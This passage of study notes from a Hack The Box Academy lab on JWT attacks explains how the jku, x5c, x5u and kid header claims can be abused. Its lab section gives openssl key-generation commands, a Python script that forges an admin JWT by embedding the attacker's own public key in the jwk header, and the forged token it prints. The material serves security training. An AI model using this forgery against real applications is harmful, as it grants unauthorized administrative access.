Finally, we can use our forged token to obtain administrative access:

<figure><img src="../../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

### Exploiting jku

Another interesting claim is the `jku` claim, which has the following purpose, according to the [JWS standard](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2):

```
The "jku" (JWK Set URL) Header Parameter is a URI that refers to a resource for a set of JSON-encoded public keys,
one of which corresponds to the key used to digitally sign the JWS.
The keys MUST be encoded as a JWK Set. The protocol used to acquire the resource MUST provide integrity protection;
an HTTP GET request to retrieve the JWK Set MUST use Transport Layer Security (TLS),
and the identity of the server MUST be validated,
as per [Section 6 of RFC 6125]. Also, see [Section 8] on TLS requirements.
Use of this Header Parameter is OPTIONAL.
```

As such, the `jku` claim serves a similar purpose to the `jwk` claim. However, instead of holding the key details directly, the claim contains a URL that serves the key details. If a web application does not correctly check this claim, it can be exploited by an attacker similar to the jwk claim. The process is nearly identical; however, instead of embedding the key details into the jwk claim, the attacker hosts the key details on his web server and sets the JWT's jku claim to the corresponding URL.

Furthermore, the jku claim may potentially be exploited for blind GET-based Server Side Request Forgery (SSRF) attacks. For more details on these types of attacks, check out the [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module.

### Further Claims

There are further JWT claims that can be potentially exploited. These include the `x5c` and `x5u` claims, which serve a similar purpose to the jwk and jku claims. The main difference is that these claims do not contain information about the public key but about the certificate or certificate chain. However, exploiting these claims is similar to the jwk and jku exploits. Finally, there is the `kid` claim, which uniquely identifies the key used to secure the JWT. Depending on how the web application handles this parameter, it may lead to a broad spectrum of web vulnerabilities, including path traversal, SQL injection, and even command injection. However, these would require severe misconfigurations within the web application that rarely occur in the real world.

For more details on these claims, check out the [JWS standard](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1).

### Labs - Questions

Frist we nedd generate the public key -->

```
eldeim@htb[/htb]$ openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048

eldeim@htb[/htb]$ openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```

<figure><img src="../../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

With these keys, we need to perform the following steps:

* Manipulate the JWT's payload to set the `isAdmin` claim to `true`
* Manipulate the JWT's header to set the `jwk` claim to our public key's details
* Sign the JWT using our private key

We can automate the exploitation using the following python script:

```
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```

```shell-session
eldeim@htb[/htb]$ pip3 install pyjwt cryptography python-jose

eldeim@htb[/htb]$ python3 exploit.py 

eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6InZldjJLQ2VBNmk3dnBNTTVDek9QeU52RGZDTjJsUEdvcTVValp3MldMUk1nQmIwWEk3OVVoUlNpMjhTUUdaV0NBN0VNOVZiVmpmVW5RRHpHR1ljVlN2YjEycXhHejB6QzE4MVRpWFJ2cW9HWUk1VkVQWmVYOG96VzcyR19BMWhTd29IOC13UmNPVWJQcVFOcUZFT2FoeXVSeHRKeW50cmpEeUFTeWhzNTRfWS1IbnpTZTJQUnNsc2FucXhzMEpVSzVpMGxkUG9DZzlQYnBEOG80OU9EMmwzNUYwRVZWdmJRQ1BuNTVxMld4dURrc1JJSHpmUHkyUlFUU3hkRFJGWkN3U3Y5eHUta29JcjB2YWxlU0I5SUdVbGpvNUNkNUNqWTNIVzRSSDlCa3FtUmlhWnJNaExXLWc5a2ZRdVRBaTg1THR0bHdBSUY4ak94R0xKNkM0LWp6USJ9LCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZX0.bFM8pBMqgGA3i6SJrm4BLz8UNHaTOflLXqXNs2Jw7gD0Fx-ilzvUKtgFroskghlJxuXgtRGhX0xpMARi3STpKy88L2oqSMeK7sCnh3RLBiDR0_yx_q36ZAxnK-SvsatJ6lb2kQkUwBJf-AFnfi6x5mo3-zGYXxYMAslWRXoK-o7PHSDaac_qOIUJtyWCcaK-WzqRj4MqGXpS3GiYinTZz6C1nRaLk11hwC4qFuqb4wzCt42DCQ6th-Vn1QID856GID8rxwaFyfr8aTNFxoE_BmSoJlJBfkr7vTLycx5H9cjpruXoybLedzctqYIkgJtAA9SxyOtYv0ta8ZgmEtTjoQ
```

Now, remplace it -->

<figure><img src="../../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
